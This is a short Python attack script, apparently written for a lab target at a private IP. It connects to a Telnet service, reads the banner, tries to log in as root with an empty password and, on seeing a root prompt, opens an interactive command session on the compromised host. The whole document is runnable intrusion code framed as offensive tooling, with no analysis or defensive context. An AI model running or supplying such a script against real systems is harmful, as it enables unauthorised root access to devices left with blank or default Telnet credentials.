import telnetlib
import sys
import select

def connect_telnet(host, port=23):
    """
    Connect to the Telnet service on the target host and port.
    """
    try:
        tn = telnetlib.Telnet(host, port, timeout=10)
        print(f"[+] Connected to {host}:{port}")
        banner = tn.read_until(b"login: ", timeout=5)
        print(f"[+] Telnet Banner: {banner.decode().strip()}")
        return tn
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

def attempt_login(tn, username="root", password=""):
    """
    Attempt to log in to the Telnet service using the provided username and password.
    """
    try:
        tn.write(f"{username}\n".encode('ascii'))
        tn.read_until(b"Password: ", timeout=5)
        tn.write(f"{password}\n".encode('ascii'))

        response = tn.read_until(b"#", timeout=5)
        if b"#" in response:
            print("[+] Successfully logged in as root!")
            return True
        else:
            print("[-] Login failed or restricted access.")
            return False
    except Exception as e:
        print(f"[-] Login attempt failed: {e}")
        return False

def interactive_session(tn):
    """
    Start an interactive Telnet session, allowing the user to send commands and receive responses.
    """
    print("[+] Interactive session started. Type your commands below.")
    print("[+] Type 'exit' to terminate the session.\n")
    
    try:
        while True:
            ready, _, _ = select.select([tn, sys.stdin], [], [])

            # Read server response and display it to the user
            if tn in ready:
                data = tn.read_eager()
                if data:
                    print(data.decode(), end='')

            # Read user input and send it to the Telnet server
            if sys.stdin in ready:
                user_input = sys.stdin.readline().strip()
                
                if user_input.lower() == "exit":
                    print("[+] Exiting the interactive session.")
                    break
                
                # Send command to Telnet server
                tn.write(user_input.encode('ascii') + b"\n")
                
    except KeyboardInterrupt:
        print("\n[!] Session interrupted by user.")
    except Exception as e:
        print(f"[-] An error occurred during the session: {e}")
    finally:
        tn.close()
        print("[+] Telnet session closed.")

def main():
    host = "192.168.65.136"  # Target Telnet server IP

    # Connect to Telnet
    tn = connect_telnet(host)
    if tn:
        # Try to login as root without a password
        if attempt_login(tn, "root", ""):
            # Start interactive session after successful login
            interactive_session(tn)

if __name__ == "__main__":
    main()
